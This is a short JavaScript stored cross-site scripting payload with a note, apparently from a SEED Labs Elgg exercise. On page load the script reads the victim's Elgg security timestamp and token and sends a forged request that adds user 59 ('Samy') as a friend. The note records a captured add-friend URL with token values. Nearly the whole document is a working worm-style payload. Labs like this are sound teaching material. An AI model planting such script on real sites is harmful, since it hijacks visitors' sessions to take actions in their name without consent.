<script type="text/javascript">
window.onload = function(){
 var Ajax=null;

 var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
 var token="&__elgg_token="+elgg.security.token.__elgg_token;

 var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token;

 Ajax=new XMLHttpRequest();
 Ajax.open("GET", sendurl, true);
 Ajax.send();
}
</script>



URL For Adding Samy: http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1677296643&__elgg_token=h9RSz7VkhFQzYQ5i0XFXSg&__elgg_ts=1677296643&__elgg_token=h9RSz7VkhFQzYQ5i0XFXSg